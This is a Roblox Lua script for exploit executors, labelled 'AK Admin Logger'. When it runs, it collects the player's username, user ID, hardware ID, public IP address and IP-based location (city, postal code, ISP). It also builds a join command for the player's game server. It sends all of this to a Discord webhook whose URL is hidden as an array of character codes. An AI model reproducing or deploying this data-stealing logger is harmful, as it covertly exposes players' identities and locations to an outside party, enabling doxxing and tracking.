local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local GroupService = game:GetService("GroupService")
local BadgeService = game:GetService("BadgeService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
local Hwid = RbxAnalyticsService:GetClientId()
local funneh = "'"
local joinings = "game:GetService('TeleportService'):Teleport("..game.PlaceId..",game.Players.LocalPlayer,"..funneh..game.JobId..funneh..")"
local joinwithscript = "```lua\n "..joinings.." ```"
local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local GameName = GameInfo.Name
local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

local PlayerProfilePic = string.format(
    "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
    UserId
)

local GameThumbnailUrl = string.format(
    "https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png",
    game.PlaceId
)

local function detectExecutor()
    return identifyexecutor()
end

local function createWebhookData()
    local executor = detectExecutor()
    local date = os.date("%m/%d/%Y")
    local time = os.date("%X")
    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
    local playerLink = "https://www.roblox.com/users/" .. UserId
    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
    local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId

    local data = {
        username = "AK Admin Logger",
        avatar_url = "https://i.imgur.com/AfFp7pu.png",
        embeds = {
            {
                title = "🎮 Spiel Information",
                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
                color = tonumber("0x2ecc71"),
                image = { url = GameThumbnailUrl }
            },
            {
                title = "👤 Spieler Information",
                description = string.format(
                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Mitgliedschaft:** %s\n**Account-Alter:** %d Tage\n**Plattform:** %s\n**Ping:** %dms",
                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
                ),
                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db"),
                thumbnail = { url = PlayerProfilePic }
            },
            {
                title = "🌐 Standort & Netzwerk",
                description = string.format(
                    "**IP:** `%s`\n**HWID:** `%s`\n**Land:** %s :flag_%s:\n**Region:** %s\n**Stadt:** %s\n**PLZ:** %s\n**ISP:** %s\n**Organisation:** %s\n**Zeitzone:** %s",
                    GetIp, Hwid, GetData.country, string.lower(GetData.countryCode), GetData.regionName, GetData.city, GetData.zip, GetData.isp, GetData.org, GetData.timezone
                ),
                color = tonumber("0xe74c3c")
            },
            {
                title = "⚙️ Technische Details",
                description = string.format(
                    "**Executor:** `%s`\n**Job ID:** [Klicken zum Kopieren](%s)\n**Mobile Join:** [Klicken](%s)\n**Code to join: **"..joinwithscript,
                    executor, jobIdLink, mobileJoinLink
                ),
                color = tonumber("0x95a5a6"),
                footer = { 
                    text = string.format("📅 Datum: %s | ⏰ Zeit: %s", date, time),
                    icon_url = PlayerProfilePic
                }
            }
        }
    }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(webhookRequest)
end


local webhookUrl_encoded = { 104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 51, 50, 57, 50, 49, 51, 57, 56, 56, 50, 52, 56, 48, 57, 50, 56, 51, 52, 47, 81, 109, 71, 119, 99, 71, 104, 113, 85, 104, 78, 105, 99, 75, 120, 103, 116, 54, 66, 77, 51, 117, 102, 54, 76, 83, 95, 73, 55, 109, 109, 88, 85, 78, 53, 72, 56, 99, 110, 45, 53, 56, 45, 80, 113, 106, 57, 81, 81, 54, 70, 115, 49, 74, 48, 106, 118, 85, 49, 84, 74, 67, 122, 107, 99, 68, 122, 90 }
local webhookUrl = ""
for i = 1, #webhookUrl_encoded do
  webhookUrl = webhookUrl .. string.char(webhookUrl_encoded[i])
end

local webhookData = createWebhookData()
sendWebhook(webhookUrl, webhookData)
